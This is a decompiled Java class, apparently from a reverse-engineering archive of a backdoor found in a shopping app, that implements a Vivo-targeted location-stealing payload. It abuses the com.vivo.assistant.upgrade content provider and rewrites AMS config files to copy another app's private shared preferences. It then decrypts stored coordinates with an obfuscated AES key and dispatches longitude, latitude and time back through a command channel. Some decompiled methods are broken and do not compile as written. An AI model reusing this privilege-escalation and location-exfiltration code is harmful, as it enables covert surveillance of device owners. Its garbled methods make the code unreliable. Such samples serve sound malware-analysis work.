package com.google.android.sd.biz_dynamic_dex.vivo_get_loc;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.Uri;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.base.a;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.util.zip.Inflater;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;

public class VivoGetLocExecutor extends DynamicCmdExecutor {
  private static final byte[] a = b(new byte[] { 
        22, 61, -71, -109, 16, -71, -112, 22, -105, 57, 
        -69, -112, 56, 57, 56, 60, -68, -111, 18, 59, 
        56, 57, 16, -107, 61, -72, 19, 56, 19, 16, 
        -71, 3 });
  
  private static final String b = a(new byte[] { -70, -77, 76 });
  
  private static final String c = a(new byte[] { 
        -70, -77, -122, -114, 56, 56, -114, 7, 53, -68, 
        -80, -117, 10, 32, 58, -72, 62, 59, 60, 86 });
  
  private String d;
  
  private String e;
  
  private String f;
  
  private Uri g;
  
  private long h = 3000L;
  
  private JSONObject i;
  
  private static SharedPreferences a(Context paramContext, File paramFile) {
    try {
      SharedPreferences sharedPreferences = (SharedPreferences)Class.forName("android.content.Context").getMethod("getSharedPreferences", new Class[] { File.class, int.class }).invoke(paramContext, new Object[] { paramFile, Integer.valueOf(4) });
      if (sharedPreferences != null)
        return sharedPreferences; 
    } catch (Exception exception) {}
    return null;
  }
  
  private static String a(byte[] paramArrayOfbyte) {
    return new String(b(paramArrayOfbyte));
  }
  
  private void a() {
    try {
      Thread.sleep(this.h);
      return;
    } catch (InterruptedException interruptedException) {
      return;
    } 
  }
  
  private static void a(Context paramContext) {
    try {
      File file = new File(a.a(paramContext), "tmp.xml");
      if (file.exists())
        file.delete(); 
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  private static void a(Context paramContext, String paramString1, String paramString2) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(1052, paramString1, "client"), paramString2, null));
    a(paramContext);
  }
  
  private static byte[] a(byte[] paramArrayOfbyte1, byte[] paramArrayOfbyte2, byte[] paramArrayOfbyte3) {
    if (paramArrayOfbyte2 == null)
      return null; 
    try {
      SecretKeySpec secretKeySpec = new SecretKeySpec(paramArrayOfbyte2, b);
      return cipher.doFinal(paramArrayOfbyte1);
    } finally {
      paramArrayOfbyte1 = null;
      paramArrayOfbyte1.printStackTrace();
    } 
  }
  
  private static byte[] b(byte[] paramArrayOfbyte) {
    byte[] arrayOfByte = new byte[paramArrayOfbyte.length];
    for (int i = paramArrayOfbyte.length - 1; i >= 0; i--) {
      int j = paramArrayOfbyte[i] & 0xFF;
      byte b = (byte)(j >>> 7 | j << 1);
      if (i == paramArrayOfbyte.length - 1) {
        j = paramArrayOfbyte[0];
      } else {
        j = arrayOfByte[i + 1];
      } 
      arrayOfByte[i] = (byte)((byte)(b ^ j) ^ 0x71);
    } 
    return arrayOfByte;
  }
  
  private static byte[] c(byte[] paramArrayOfbyte) {
    byte[] arrayOfByte;
    Inflater inflater2 = null;
    Exception exception = null;
    Inflater inflater1 = inflater2;
    if (paramArrayOfbyte != null) {
      inflater1 = inflater2;
      if (paramArrayOfbyte.length > 0) {
        inflater1 = new Inflater(false);
        inflater1.reset();
        inflater1.setInput(paramArrayOfbyte);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(paramArrayOfbyte.length);
        try {
          paramArrayOfbyte = new byte[8192];
          while (!inflater1.finished()) {
            int i = inflater1.inflate(paramArrayOfbyte);
            if (i == 0)
              try {
                return null;
              } catch (IOException iOException1) {
                return null;
              }  
            byteArrayOutputStream.write((byte[])iOException1, 0, i);
          } 
          paramArrayOfbyte = byteArrayOutputStream.toByteArray();
        } catch (Exception exception1) {
          exception1.printStackTrace();
        } finally {
          try {
            byteArrayOutputStream.close();
          } catch (IOException iOException) {
            iOException.printStackTrace();
          } 
        } 
        iOException.end();
        arrayOfByte = paramArrayOfbyte;
      } 
    } 
    return arrayOfByte;
  }
  
  public void realExecute(Context paramContext, String paramString) {
    // Byte code:
    //   0: ldc ''
    //   2: astore #13
    //   4: aload_0
    //   5: new org/json/JSONObject
    //   8: dup
    //   9: aload_2
    //   10: invokespecial <init> : (Ljava/lang/String;)V
    //   13: ldc 'uuid'
    //   15: invokevirtual optString : (Ljava/lang/String;)Ljava/lang/String;
    //   18: putfield d : Ljava/lang/String;
    //   21: goto -> 24
    //   24: ldc 'com.vivo.browser'
    //   26: aload_1
    //   27: invokevirtual getPackageName : ()Ljava/lang/String;
    //   30: invokestatic equals : (Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Z
    //   33: ifeq -> 43
    //   36: ldc_w '{\\n    "fp_config":{\\n        "fp_uri":"content://com.vivo.assistant.upgrade",\\n        "service_path":"com.vivo.browser.hiboardlocal.NovelPluginCardService",\\n        "check_fp_ts":3000,\\n        "ams_config":{\\n            "config_list":[\\n                {\\n                    "old_md5":"12b5e396cfc22cec37b29e6de3a73ebf",\\n                    "new_md5":"a6791bf01c1fd83a4f5629e02bcaa4bc",\\n                    "url_type":"1",\\n                    "url_suffix":"/ams3/a13c87b3-ff68-4475-bccf-88af6d14011c.xml"\\n                },\\n                {\\n                    "old_md5":"ec3c99463059ff2bb80ad81660167710",\\n                    "new_md5":"b0de811037ae115b90239e25dee3a71b",\\n                    "url_type":"1",\\n                    "url_suffix":"/ams5704/22917aba-b2cf-4764-a11c-25a673fef904.xml"\\n                }\\n            ]\\n        }\\n    }\\n}'
    //   39: astore_2
    //   40: goto -> 65
    //   43: ldc_w 'com.bbk.appstore'
    //   46: aload_1
    //   47: invokevirtual getPackageName : ()Ljava/lang/String;
    //   50: invokestatic equals : (Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Z
    //   53: ifeq -> 63
    //   56: ldc_w '{\\n    "fp_config":{\\n        "fp_uri":"content://com.vivo.assistant.upgrade",\\n        "service_path":"com.bbk.appstore.openinterface.LauncherRemoteService",\\n        "check_fp_ts":3000,\\n        "ams_config":{\\n            "config_list":[\\n                {\\n                    "old_md5":"12b5e396cfc22cec37b29e6de3a73ebf",\\n                    "new_md5":"a6791bf01c1fd83a4f5629e02bcaa4bc",\\n                    "url_type":"1",\\n                    "url_suffix":"/ams3/a13c87b3-ff68-4475-bccf-88af6d14011c.xml"\\n                },\\n                {\\n                    "old_md5":"ec3c99463059ff2bb80ad81660167710",\\n                    "new_md5":"b0de811037ae115b90239e25dee3a71b",\\n                    "url_type":"1",\\n                    "url_suffix":"/ams5704/22917aba-b2cf-4764-a11c-25a673fef904.xml"\\n                }\\n            ]\\n        }\\n    }\\n}'
    //   59: astore_2
    //   60: goto -> 65
    //   63: aconst_null
    //   64: astore_2
    //   65: new org/json/JSONObject
    //   68: dup
    //   69: aload_2
    //   70: invokespecial <init> : (Ljava/lang/String;)V
    //   73: ldc_w 'fp_config'
    //   76: invokevirtual optJSONObject : (Ljava/lang/String;)Lorg/json/JSONObject;
    //   79: astore_2
    //   80: aload_2
    //   81: ifnull -> 162
    //   84: aload_2
    //   85: invokevirtual length : ()I
    //   88: ifgt -> 94
    //   91: goto -> 162
    //   94: aload_0
    //   95: aload_2
    //   96: ldc_w 'service_path'
    //   99: ldc ''
    //   101: invokevirtual optString : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   104: putfield e : Ljava/lang/String;
    //   107: aload_2
    //   108: ldc_w 'fp_uri'
    //   111: ldc ''
    //   113: invokevirtual optString : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   116: astore #14
    //   118: aload_0
    //   119: aload #14
    //   121: putfield f : Ljava/lang/String;
    //   124: aload_0
    //   125: aload #14
    //   127: invokestatic parse : (Ljava/lang/String;)Landroid/net/Uri;
    //   130: putfield g : Landroid/net/Uri;
    //   133: aload_0
    //   134: aload_2
    //   135: ldc_w 'check_fp_ts'
    //   138: sipush #3000
    //   141: invokevirtual optInt : (Ljava/lang/String;I)I
    //   144: i2l
    //   145: putfield h : J
    //   148: aload_0
    //   149: aload_2
    //   150: ldc_w 'ams_config'
    //   153: invokevirtual optJSONObject : (Ljava/lang/String;)Lorg/json/JSONObject;
    //   156: putfield i : Lorg/json/JSONObject;
    //   159: goto -> 162
    //   162: new java/lang/StringBuilder
    //   165: dup
    //   166: ldc ''
    //   168: invokespecial <init> : (Ljava/lang/String;)V
    //   171: astore_2
    //   172: new java/lang/StringBuilder
    //   175: dup
    //   176: ldc_w 'amsDoubleSuc; '
    //   179: invokespecial <init> : (Ljava/lang/String;)V
    //   182: astore #14
    //   184: aload #14
    //   186: aload_1
    //   187: invokevirtual getPackageName : ()Ljava/lang/String;
    //   190: aload_0
    //   191: getfield e : Ljava/lang/String;
    //   194: aload_0
    //   195: getfield f : Ljava/lang/String;
    //   198: invokestatic a : (Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   201: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   204: pop
    //   205: aload_2
    //   206: aload #14
    //   208: invokevirtual toString : ()Ljava/lang/String;
    //   211: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   214: pop
    //   215: aload_0
    //   216: invokespecial a : ()V
    //   219: aload_1
    //   220: aload_0
    //   221: getfield g : Landroid/net/Uri;
    //   224: invokestatic a : (Landroid/content/Context;Landroid/net/Uri;)Z
    //   227: ifne -> 337
    //   230: aload_0
    //   231: getfield i : Lorg/json/JSONObject;
    //   234: astore #14
    //   236: aload #14
    //   238: ifnull -> 337
    //   241: aload #14
    //   243: invokevirtual length : ()I
    //   246: ifle -> 337
    //   249: aload_1
    //   250: aload_0
    //   251: getfield i : Lorg/json/JSONObject;
    //   254: invokestatic a : (Landroid/content/Context;Lorg/json/JSONObject;)Ljava/lang/String;
    //   257: astore #14
    //   259: aload_2
    //   260: ldc_w '; updateAmsFile_'
    //   263: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   266: pop
    //   267: aload_2
    //   268: aload #14
    //   270: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   273: pop
    //   274: ldc_w 'success'
    //   277: aload #14
    //   279: invokestatic equals : (Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Z
    //   282: ifeq -> 321
    //   285: aload_0
    //   286: invokespecial a : ()V
    //   289: aload_2
    //   290: ldc_w '; '
    //   293: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   296: pop
    //   297: aload_2
    //   298: aload_1
    //   299: invokevirtual getPackageName : ()Ljava/lang/String;
    //   302: aload_0
    //   303: getfield e : Ljava/lang/String;
    //   306: aload_0
    //   307: getfield f : Ljava/lang/String;
    //   310: invokestatic a : (Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   313: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   316: pop
    //   317: aload_0
    //   318: invokespecial a : ()V
    //   321: aload_2
    //   322: ldc_w '; recoverAmsFile_'
    //   325: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   328: pop
    //   329: aload_2
    //   330: invokestatic a : ()Ljava/lang/String;
    //   333: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   336: pop
    //   337: aload_1
    //   338: aload_0
    //   339: getfield g : Landroid/net/Uri;
    //   342: invokestatic a : (Landroid/content/Context;Landroid/net/Uri;)Z
    //   345: ifne -> 366
    //   348: aload_0
    //   349: getfield d : Ljava/lang/String;
    //   352: astore_2
    //   353: ldc_w 'grant_fp_fail'
    //   356: astore #13
    //   358: aload_1
    //   359: aload_2
    //   360: aload #13
    //   362: invokestatic a : (Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   365: return
    //   366: new java/io/File
    //   369: dup
    //   370: aload_1
    //   371: invokestatic a : (Landroid/content/Context;)Ljava/io/File;
    //   374: ldc 'tmp.xml'
    //   376: invokespecial <init> : (Ljava/io/File;Ljava/lang/String;)V
    //   379: astore_2
    //   380: aload_2
    //   381: invokevirtual exists : ()Z
    //   384: ifne -> 392
    //   387: aload_2
    //   388: invokevirtual createNewFile : ()Z
    //   391: pop
    //   392: aload_1
    //   393: ldc_w 'content://com.vivo.assistant.upgrade/data/user_de/0/com.vivo.aiengine/shared_prefs/com.vivo.aiengine.xml'
    //   396: invokestatic parse : (Ljava/lang/String;)Landroid/net/Uri;
    //   399: aload_2
    //   400: invokestatic a : (Landroid/content/Context;Landroid/net/Uri;Ljava/io/File;)Z
    //   403: ifne -> 419
    //   406: aload_0
    //   407: getfield d : Ljava/lang/String;
    //   410: astore_2
    //   411: ldc_w 'copy fail'
    //   414: astore #13
    //   416: goto -> 358
    //   419: aload_1
    //   420: aload_2
    //   421: invokestatic a : (Landroid/content/Context;Ljava/io/File;)Landroid/content/SharedPreferences;
    //   424: astore_2
    //   425: aload_2
    //   426: ifnonnull -> 442
    //   429: aload_0
    //   430: getfield d : Ljava/lang/String;
    //   433: astore_2
    //   434: ldc_w 'sp is null'
    //   437: astore #13
    //   439: goto -> 358
    //   442: aload_2
    //   443: ldc_w 'sd4936344649354346343251404645'
    //   446: ldc ''
    //   448: invokeinterface getString : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   453: astore_2
    //   454: aload_2
    //   455: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   458: ifeq -> 474
    //   461: aload_0
    //   462: getfield d : Ljava/lang/String;
    //   465: astore_2
    //   466: ldc_w 'value is empty'
    //   469: astore #13
    //   471: goto -> 358
    //   474: new org/json/JSONArray
    //   477: dup
    //   478: aload_2
    //   479: invokespecial <init> : (Ljava/lang/String;)V
    //   482: astore #16
    //   484: aload #16
    //   486: invokevirtual length : ()I
    //   489: istore #8
    //   491: ldc2_w -1
    //   494: lstore #9
    //   496: iconst_0
    //   497: istore #7
    //   499: aconst_null
    //   500: astore #14
    //   502: aload #13
    //   504: astore_2
    //   505: iload #7
    //   507: iload #8
    //   509: if_icmpge -> 725
    //   512: aload #16
    //   514: iload #7
    //   516: invokevirtual optString : (I)Ljava/lang/String;
    //   519: astore #15
    //   521: getstatic com/google/android/sd/biz_dynamic_dex/vivo_get_loc/VivoGetLocExecutor.a : [B
    //   524: astore #13
    //   526: aload #15
    //   528: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   531: ifeq -> 540
    //   534: aload_2
    //   535: astore #13
    //   537: goto -> 645
    //   540: aload #15
    //   542: invokevirtual getBytes : ()[B
    //   545: iconst_0
    //   546: invokestatic decode : ([BI)[B
    //   549: astore #15
    //   551: bipush #16
    //   553: newarray byte
    //   555: astore #17
    //   557: aload #15
    //   559: iconst_0
    //   560: aload #17
    //   562: iconst_0
    //   563: bipush #16
    //   565: invokestatic arraycopy : (Ljava/lang/Object;ILjava/lang/Object;II)V
    //   568: aload #15
    //   570: arraylength
    //   571: bipush #16
    //   573: isub
    //   574: newarray byte
    //   576: astore #18
    //   578: aload #15
    //   580: bipush #16
    //   582: aload #18
    //   584: iconst_0
    //   585: aload #15
    //   587: arraylength
    //   588: bipush #16
    //   590: isub
    //   591: invokestatic arraycopy : (Ljava/lang/Object;ILjava/lang/Object;II)V
    //   594: aload #18
    //   596: aload #13
    //   598: aload #17
    //   600: invokestatic a : ([B[B[B)[B
    //   603: astore #13
    //   605: aload #13
    //   607: ifnull -> 642
    //   610: aload #13
    //   612: invokestatic c : ([B)[B
    //   615: astore #13
    //   617: aload #13
    //   619: ifnonnull -> 625
    //   622: goto -> 642
    //   625: new java/lang/String
    //   628: dup
    //   629: aload #13
    //   631: invokespecial <init> : ([B)V
    //   634: invokevirtual trim : ()Ljava/lang/String;
    //   637: astore #13
    //   639: goto -> 645
    //   642: aload_2
    //   643: astore #13
    //   645: aload #13
    //   647: astore #15
    //   649: aload #15
    //   651: ldc_w ','
    //   654: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   657: astore #17
    //   659: lload #9
    //   661: lstore #11
    //   663: aload #14
    //   665: astore #13
    //   667: aload #17
    //   669: arraylength
    //   670: iconst_3
    //   671: if_icmplt -> 708
    //   674: lload #9
    //   676: lstore #11
    //   678: aload #14
    //   680: astore #13
    //   682: aload #17
    //   684: iconst_2
    //   685: aaload
    //   686: invokestatic parseLong : (Ljava/lang/String;)J
    //   689: lload #9
    //   691: lcmp
    //   692: ifle -> 708
    //   695: aload #17
    //   697: iconst_2
    //   698: aaload
    //   699: invokestatic parseLong : (Ljava/lang/String;)J
    //   702: lstore #11
    //   704: aload #15
    //   706: astore #13
    //   708: iload #7
    //   710: iconst_1
    //   711: iadd
    //   712: istore #7
    //   714: lload #11
    //   716: lstore #9
    //   718: aload #13
    //   720: astore #14
    //   722: goto -> 505
    //   725: aload #14
    //   727: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   730: ifne -> 831
    //   733: aload #14
    //   735: ldc_w ','
    //   738: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   741: astore_2
    //   742: aload_2
    //   743: iconst_0
    //   744: aaload
    //   745: invokestatic parseDouble : (Ljava/lang/String;)D
    //   748: dstore_3
    //   749: aload_2
    //   750: iconst_1
    //   751: aaload
    //   752: invokestatic parseDouble : (Ljava/lang/String;)D
    //   755: dstore #5
    //   757: aload_0
    //   758: getfield d : Ljava/lang/String;
    //   761: astore_2
    //   762: new org/json/JSONObject
    //   765: dup
    //   766: invokespecial <init> : ()V
    //   769: astore #13
    //   771: aload #13
    //   773: ldc_w 'longitude'
    //   776: dload_3
    //   777: invokevirtual put : (Ljava/lang/String;D)Lorg/json/JSONObject;
    //   780: pop
    //   781: aload #13
    //   783: ldc_w 'latitude'
    //   786: dload #5
    //   788: invokevirtual put : (Ljava/lang/String;D)Lorg/json/JSONObject;
    //   791: pop
    //   792: aload #13
    //   794: ldc_w 'time'
    //   797: lload #9
    //   799: invokevirtual put : (Ljava/lang/String;J)Lorg/json/JSONObject;
    //   802: pop
    //   803: aload_1
    //   804: new com/google/android/sd/cmd/CmdData
    //   807: dup
    //   808: sipush #1052
    //   811: aload_2
    //   812: ldc 'client'
    //   814: invokespecial <init> : (ILjava/lang/String;Ljava/lang/String;)V
    //   817: aload #13
    //   819: aconst_null
    //   820: invokestatic buildSucceedRespData : (Lcom/google/android/sd/cmd/CmdData;Lorg/json/JSONObject;Lorg/json/JSONObject;)Lcom/google/android/sd/cmd/CmdData;
    //   823: invokestatic dispatch : (Landroid/content/Context;Lcom/google/android/sd/cmd/CmdData;)V
    //   826: aload_1
    //   827: invokestatic a : (Landroid/content/Context;)V
    //   830: return
    //   831: aload_0
    //   832: getfield d : Ljava/lang/String;
    //   835: astore_2
    //   836: aconst_null
    //   837: astore #13
    //   839: goto -> 358
    //   842: astore_2
    //   843: goto -> 24
    //   846: astore_2
    //   847: goto -> 162
    //   850: astore_2
    //   851: goto -> 826
    // Exception table:
    //   from	to	target	type
    //   4	21	842	java/lang/Exception
    //   65	80	846	java/lang/Exception
    //   84	91	846	java/lang/Exception
    //   94	159	846	java/lang/Exception
    //   762	826	850	finally
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\7877ec6850344e7aad5fdd57f6abf238-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_get_loc\VivoGetLocExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */